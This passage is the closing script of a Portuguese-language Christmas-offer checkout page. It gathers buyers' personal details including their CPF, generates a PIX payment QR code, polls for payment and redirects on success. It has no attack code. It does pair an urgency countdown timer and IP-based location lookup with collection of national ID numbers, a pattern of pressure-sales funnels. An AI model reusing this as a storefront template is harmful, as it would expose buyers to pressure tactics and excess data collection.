            statusDiv.innerHTML = '<div class="flex items-center justify-center gap-2"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-4 h-4 text-green-600"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg><span class="text-sm text-green-700 font-medium">Pagamento confirmado! üéâ</span></div>';
            statusDiv.classList.remove('bg-yellow-50', 'border-yellow-200');
            statusDiv.classList.add('bg-green-50', 'border-green-200');
            confirmBtn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="w-5 h-5"><circle cx="12" cy="12" r="10"/><path d="m9 12 2 2 4-4"/></svg><span>Pagamento Confirmado!</span>';
            confirmBtn.classList.remove('bg-christmas-red', 'hover:bg-red-700');
            confirmBtn.classList.add('bg-green-600');
            confirmBtn.disabled = true;
            setTimeout(function() {
                window.location.href = 'https://ofertanatalshow.shop/quiz.html/product.html/checkout.html/payment-success.html';
            }, 2000);
        }

        function showPixSection(pixData) {
            document.getElementById('checkoutSection').classList.add('hidden');
            document.getElementById('pixSection').classList.remove('hidden');
            const shippingCost = shippingType === 'fast' ? fastShippingPrice : 0;
            const total = productPrice + shippingCost;
            document.getElementById('pixAmountDisplay').textContent = `R$ ${(total / 100).toFixed(2)}`;
            if (pixData.pix_code) {
                currentPixCode = pixData.pix_code;
                document.getElementById('pixCodeDisplay').textContent = pixData.pix_code;
                const qrContainer = document.getElementById('qrCodeImage');
                qrContainer.innerHTML = '';
                if (qrCodeInstance) {
                    qrCodeInstance.clear();
                }
                qrCodeInstance = new QRCode(qrContainer, {
                    text: pixData.pix_code,
                    width: 220,
                    height: 220,
                    colorDark: '#000000',
                    colorLight: '#ffffff',
                    correctLevel: QRCode.CorrectLevel.M
                });
            }
            currentTransactionId = pixData.transaction_id;
            pixTimeLeft = 15 * 60;
            if (pixTimerInterval) clearInterval(pixTimerInterval);
            pixTimerInterval = setInterval(updatePixTimer, 1000);
            updatePixTimer();
            if (statusCheckInterval) clearInterval(statusCheckInterval);
            statusCheckInterval = setInterval(async () => {
                try {
                    const response = await fetch(API_URL + '/check-status', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            transaction_id: currentTransactionId
                        })
                    });
                    const data = await response.json();
                    if (data.success && data.data && data.data.status === 'paid') {
                        showPaymentSuccess();
                    }
                } catch (error) {
                    console.error('Erro na verifica√ß√£o autom√°tica:', error);
                }
            }, 5000);
            window.scrollTo(0, 0);
        }

        function cancelPixPayment() {
            if (pixTimerInterval) clearInterval(pixTimerInterval);
            if (statusCheckInterval) clearInterval(statusCheckInterval);
            currentTransactionId = null;
            currentPixCode = '';
            currentCustomerData = null;
            document.getElementById('pixSection').classList.add('hidden');
            document.getElementById('checkoutSection').classList.remove('hidden');
            window.scrollTo(0, 0);
        }

        function copyPixCode() {
            navigator.clipboard.writeText(currentPixCode).then(function() {
                const copyBtn = document.getElementById('copyBtn');
                const copyText = document.getElementById('copyText');
                copyBtn.classList.remove('border-gold', 'text-chocolate');
                copyBtn.classList.add('bg-green-600', 'text-white', 'border-green-600');
                copyText.textContent = 'C√≥digo Copiado!';
                setTimeout(function() {
                    copyBtn.classList.add('border-gold', 'text-chocolate');
                    copyBtn.classList.remove('bg-green-600', 'text-white', 'border-green-600');
                    copyText.textContent = 'Copiar C√≥digo PIX';
                }, 2000);
            }).catch(function(err) {
                alert('Erro ao copiar. Por favor, copie manualmente.');
            });
        }

        async function handleSubmit(e) {
            e.preventDefault();
            hideError();

            const formData = {
                name: document.getElementById('name').value.trim(),
                email: document.getElementById('email').value.trim(),
                cpf: document.getElementById('cpf').value.trim(),
                phone: document.getElementById('phone').value.trim(),
                cep: document.getElementById('cep').value.trim(),
                street: document.getElementById('street').value.trim(),
                number: document.getElementById('number').value.trim(),
                complement: document.getElementById('complement').value.trim(),
                neighborhood: document.getElementById('neighborhood').value.trim(),
                city: document.getElementById('city').value.trim(),
                state: document.getElementById('state').value.trim()
            };

            if (!formData.name || !formData.email || !formData.cpf || !formData.phone || 
                !formData.cep || !formData.street || !formData.number || 
                !formData.neighborhood || !formData.city || !formData.state) {
                showError('Preencha todos os campos obrigat√≥rios.');
                return;
            }

            const submitBtn = document.getElementById('submitBtn');
            const submitBtnText = document.getElementById('submitBtnText');
            const submitBtnSpinner = document.getElementById('submitBtnSpinner');
            
            submitBtn.disabled = true;
            submitBtnText.textContent = 'Gerando PIX...';
            submitBtnSpinner.classList.remove('hidden');

            try {
                currentCustomerData = formData;
                const result = await createPixTransaction(formData);
                
                if (result.success && (result.pix_code || result.transaction_id)) {
                    showPixSection(result);
                } else {
                    showError(result.error || 'Erro ao gerar c√≥digo PIX. Tente novamente.');
                }
            } catch (error) {
                console.error('Erro no checkout:', error);
                showError('Erro de conex√£o. Tente novamente.');
            } finally {
                submitBtn.disabled = false;
                submitBtnText.textContent = 'üéÅ FINALIZAR PEDIDO COM PIX';
                submitBtnSpinner.classList.add('hidden');
            }
        }


        function createSnowflakes() {
            const snowfallContainer = document.getElementById('snowfall');
            for (let i = 0; i < 30; i++) {
                const snowflake = document.createElement('div');
                snowflake.className = 'snow-flake';
                snowflake.style.left = Math.random() * 100 + '%';
                snowflake.style.animationDelay = Math.random() * 10 + 's';
                snowflake.style.animationDuration = (10 + Math.random() * 10) + 's';
                snowfallContainer.appendChild(snowflake);
            }
        }

        async function detectLocation() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                if (data.city && data.region) {
                    document.getElementById('cityName').textContent = `${data.city} - ${data.region}`;
                    document.getElementById('locationInfo').classList.remove('hidden');
                    document.getElementById('locationInfo').classList.add('flex');
                    if (data.postal) {
                        document.getElementById('cep').value = cepMask(data.postal);
                        fetchAddress(data.postal);
                    }
                }
            } catch (error) {
                console.log('N√£o foi poss√≠vel detectar a localiza√ß√£o');
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            window.scrollTo(0, 0);
            captureUtmParams();
            createSnowflakes();
            detectLocation();
            offerTimerInterval = setInterval(updateOfferTimer, 1000);
            updateOfferTimer();
            document.getElementById('phone').addEventListener('input', function(e) {
                e.target.value = phoneMask(e.target.value);
            });
            document.getElementById('cep').addEventListener('input', function(e) {
                e.target.value = cepMask(e.target.value);
                if (e.target.value.replace(/\D/g, '').length === 8) {
                    fetchAddress(e.target.value);
                }
            });
            document.getElementById('cpf').addEventListener('input', function(e) {
                e.target.value = cpfMask(e.target.value);
            });
            document.getElementById('state').addEventListener('input', function(e) {
                e.target.value = e.target.value.toUpperCase();
            });
            document.getElementById('checkoutForm').addEventListener('submit', handleSubmit);
        });
    </script>


</body></html>